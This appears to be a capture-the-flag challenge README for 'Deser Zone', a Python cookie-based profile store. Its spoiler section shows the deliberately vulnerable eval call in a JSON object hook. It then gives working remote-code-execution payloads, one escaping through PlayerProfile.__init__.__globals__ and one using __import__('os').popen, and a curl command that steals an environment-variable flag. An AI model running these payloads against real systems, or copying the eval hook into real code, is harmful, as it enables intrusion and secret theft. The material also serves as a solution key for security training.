# w08 :: Deser Zone

- **Category:** Pwn
- **Difficulty:** hard
- **Stack:** Python 3.12 / stdlib only (no third-party packages)
- **URL:** http://localhost:30008

## Brief

DESER ZONE is a stateless profile store. Your player profile — name, theme,
pinned messages — travels entirely in the `dz_profile` cookie. The server
url-safe-base64-decodes the cookie and rebuilds the profile from it with a
custom `object_hook`, so a profile document may name its own `__class__` and
hand it `args`.

The zone itself is sealed. `GET /api/zone` only ever says `zone: sealed`, and
there is no route that opens it. The flag lives in the container as the
`W0B_FLAG` environment variable, and no endpoint returns it.

## Goal

Get code execution through the profile cookie and read `W0B_FLAG` out of the
running process. Submit it.

## Hint

This is *not* pickle. The serializer is JSON — but the hook that revives typed
objects takes a class name out of the document and **calls it while the
document is still being parsed**. The class name is passed to `eval`.

A decoy sits on the filesystem: `app/flag.txt` is a placeholder, not the flag.

Ask yourself: the hook resolves the name against a small, private namespace of
zone types. What does a *class* carry besides its name?

<details>
<summary>Spoiler</summary>

The vulnerable code is in `app/server.py`, `_revive()`:

```python
cls = eval(str(name), _ZONE_TYPES)
return cls(*spec.get("args", ()))
```

`eval` runs with `_ZONE_TYPES` as globals, but it is not sandboxed. A class
object carries its defining module's globals, so the one name you are allowed
to use crawls out:

```python
PlayerProfile.__init__.__globals__['__builtins__'].eval
```

(Inside an *imported* module's globals, `__builtins__` is the builtins
**module** — reach it with `.eval`, not `['eval']`.)

There is a shorter route, since any expression is allowed as the class name:

```json
{"__class__": "__import__('os').popen", "args": ["printf %s \"$W0B_FLAG\""]}
```

Build the cookie and send it:

```bash
COOKIE=$(python - <<'PY'
import base64, json
doc = {"__class__": "PlayerProfile.__init__.__globals__['__builtins__'].eval",
       "args": ["__import__('os').popen('printf %s \"$W0B_FLAG\"').read()"]}
print(base64.urlsafe_b64encode(json.dumps(doc).encode()).decode())
PY
)
curl -s --cookie "dz_profile=$COOKIE" http://localhost:30008/api/profile
# {"cookie_present": true, "profile": {"messages": ["hex4b0t{...}"]}}
```

Or run the bundled script:

```bash
python solution/exploit.py
# [+] FLAG: hex4b0t{...}
```

`solution/probe.sh` asserts both directions: a benign profile still revives and
does **not** leak the flag, and the gadget executes and does.

</details>
